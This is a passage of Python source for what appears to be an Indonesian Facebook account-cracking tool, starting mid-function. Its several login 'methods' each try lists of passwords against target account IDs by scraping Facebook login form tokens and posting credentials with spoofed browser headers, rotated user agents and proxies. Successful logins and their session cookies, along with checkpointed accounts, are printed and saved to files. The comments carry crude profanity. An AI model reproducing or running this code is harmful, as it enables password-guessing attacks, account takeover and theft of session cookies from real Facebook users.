			ses.headers.update({"Host": "m.alpha.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=108569252539536&kid_directed_site=0&app_id=108569252539536&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv10.0%2Fdialog%2Foauth%3Fapp_id%3D108569252539536%26cbt%3D1692051707404%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2b1575c48afff4%2526domain%253Dpicsart.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fpicsart.com%25252Ff1932e6178d28d8%2526relation%253Dopener%26client_id%3D108569252539536%26display%3Dtouch%26domain%3Dpicsart.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fpicsart.com%252Fid%252F%26locale%3Den_US%26logger_id%3Df107b508c989b54%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dff4e7e2578df88%2526domain%253Dpicsart.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fpicsart.com%25252Ff1932e6178d28d8%2526relation%253Dopener%2526frame%253Df1bbe59ae081bf8%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv10.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dff4e7e2578df88%26domain%3Dpicsart.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fpicsart.com%252Ff1932e6178d28d8%26relation%3Dopener%26frame%3Df1bbe59ae081bf8%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
			"Host": "m.alpha.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://m.alpha.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://m.facebook.com/login.php?skip_api_login=1&api_key=108569252539536&kid_directed_site=0&app_id=108569252539536&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv10.0%2Fdialog%2Foauth%3Fapp_id%3D108569252539536%26cbt%3D1692051707404%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2b1575c48afff4%2526domain%253Dpicsart.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fpicsart.com%25252Ff1932e6178d28d8%2526relation%253Dopener%26client_id%3D108569252539536%26display%3Dtouch%26domain%3Dpicsart.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fpicsart.com%252Fid%252F%26locale%3DenUS%26logger_id%3Df107b508c989b54%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dff4e7e2578df88%2526domain%253Dpicsart.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fpicsart.com%25252Ff1932e6178d28d8%2526relation%253Dopener%2526frame%253Df1bbe59ae081bf8%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv10.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dff4e7e2578df88%26domain%3Dpicsart.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fpicsart.com%252Ff1932e6178d28d8%26relation%3Dopener%26frame%3Df1bbe59ae081bf8%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
			"accept-encoding": "gzip, deflate br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=108569252539536&auth_token=843af0ac84834cd3e7914eb7fa43c375&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv10.0%2Fdialog%2Foauth%3Fapp_id%3D108569252539536%26cbt%3D1692051707404%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2b1575c48afff4%2526domain%253Dpicsart.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fpicsart.com%25252Ff1932e6178d28d8%2526relation%253Dopener%26client_id%3D108569252539536%26display%3Dtouch%26domain%3Dpicsart.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fpicsart.com%252Fid%252F%26locale%3Den_US%26logger_id%3Df107b508c989b54%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dff4e7e2578df88%2526domain%253Dpicsart.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fpicsart.com%25252Ff1932e6178d28d8%2526relation%253Dopener%2526frame%253Df1bbe59ae081bf8%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv10.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=108569252539536&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dff4e7e2578df88%26domain%3Dpicsart.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fpicsart.com%252Ff1932e6178d28d8%26relation%3Dopener%26frame%3Df1bbe59ae081bf8%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxy)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f' {P}[{K}Gizell CP{P}] {K}{idf}|{pw}\n{ua}')
				open('GIZEL_CP/'+gizel_cp,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f' {P}[{H}Gizell OK{P}] {H}{idf}|{pw}\n{kuki}')
				open('GIZEL_OK/'+gizel_cp,'a').write(idf+'|'+pw+'\n')
				break
			else:continue
		except requests.exceptions.ConnectionError:time.sleep(31)
	loop+=1
#METOD TUKANG NGOCOK#
def reguler(idf,afa_aja_boleh):
	global loop,ok,cp
	rr = random.randint
	AinkRaka = random.choice(["id-ID,id;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","bd-BD,bd;q=0.9"])
	prog.update(des,description=f'\r[bold white]Reguler [bold green][{idf}] [bold white]{(loop)}/{len(id)}[/] [green]OK:[green]{(ok)}[/] [yellow]CP:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(raka)
	ses = requests.Session()
	for pw in afa_aja_boleh:
		pw = pw.lower()
		try:
			link = ses.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'mbasic.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'AXRLN2ab6tbNBxFWS6kiERe8mEyeHkpYgc1xM77joSCak8hY1B2+tWfeptUXVmRpMqno2j95r13+cw0bLoOi4A==','content-length': '2141','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl',data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in ses.cookies.get_dict().keys():
				print(f' {P}[{K}Gizell CP{P}] {K}{idf}|{pw}\n{ua}')
				open('GIZEL_CP/'+gizel_cp,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f' {P}[{H}Gizell OK{P}] {H}{idf}|{pw}\n{kuki}')
				open('GIZEL_OK/'+gizel_cp,'a').write(idf+'|'+pw+'\n')
				break
			else:continue
		except requests.exceptions.ConnectionError:time.sleep(31)
	loop+=1
#METODE MOMOK BAU#
def memex(idf,afa_aja_boleh):
	global loop,ok,cp
	rr = random.randint
	AinkRaka = random.choice(["id-ID,id;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","bd-BD,bd;q=0.9"])
	prog.update(des,description=f'\r[bold white]Memexs [bold green][{idf}] [bold white]{(loop)}/{len(id)}[/] [green]OK:[green]{(ok)}[/] [yellow]CP:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(raka)
	ses = requests.Session()
	for pw in afa_aja_boleh:
		pw = pw.lower()
		try:
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=124207444332529&kid_directed_site=0&app_id=124207444332529&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.9%2Fdialog%2Foauth%3Fclient_id%3D124207444332529%26redirect_uri%3Dhttps%253A%252F%252Fpassport.alibaba.com%252Foauth_sign.htm%253Ftype%253Dfacebook%26display%3Dpopup%26response_type%3Dcode%26scope%3Demail%252Cpublic_profile%252Cuser_work_history%26state%3Didc_7Tqp7ztCbzw2VZ9ieaLfPnA%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D384cf685-c172-4d8e-bab8-f6e2c0e30302%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fpassport.alibaba.com%2Foauth_sign.htm%3Ftype%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Didc_7Tqp7ztCbzw2VZ9ieaLfPnA%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=124207444332529&auth_token=4804b9c03a414417f796c925694149c8&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.9%2Fdialog%2Foauth%3Fclient_id%3D124207444332529%26redirect_uri%3Dhttps%253A%252F%252Fpassport.alibaba.com%252Foauth_sign.htm%253Ftype%253Dfacebook%26display%3Dpopup%26response_type%3Dcode%26scope%3Demail%252Cpublic_profile%252Cuser_work_history%26state%3Didc_7Tqp7ztCbzw2VZ9ieaLfPnA%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D384cf685-c172-4d8e-bab8-f6e2c0e30302%26tp%3Dunspecified&refsrc=deprecated&app_id=124207444332529&cancel=https%3A%2F%2Fpassport.alibaba.com%2Foauth_sign.htm%3Ftype%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Didc_7Tqp7ztCbzw2VZ9ieaLfPnA%23_%3D_&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxy)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f' {P}[{K}Gizell CP{P}] {K}{idf}|{pw}')
				open('GIZEL_CP/'+gizel_cp,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f' {P}[{H}Gizell OK{P}] {H}{idf}|{pw}\n{kuki}')
				open('GIZEL_OK/'+gizel_ok,'a').write(idf+'|'+pw+'\n')
				break
			else:continue
		except requests.exceptions.ConnectionError:time.sleep(31)
	loop+=1
#clear layar lu ngentot#
def clear():
	if "linux" in sys.platform.lower():
		try:os.system("clear")
		except:pass
	elif "win" in sys.platform.lower():
		try:os.system("cls")
		except:pass
	else:
		try:os.system("clear")
		except:pass
# * [ KEMBALI KE LAPTOP ] * #
def back():
	rakaexde()
# * [ PENGANGUR JALAN 1 ] * #
def __raka_andrian___(raka):
        for e in raka + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.007)
# * [ PENGANGGUR JALAN 2 ] * #
def __raka_andrian___2__(raka):
        for e in raka + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.030)			
# * [ SYSTEM KONTOL ] * #
if __name__=='__main__':
	try:os.mkdir('GIZEL_OK')
	except:pass
	try:os.mkdir('GIZEL_CP')
	except:pass
	try:os.system('clear')
	except:pass
	rakaexde()

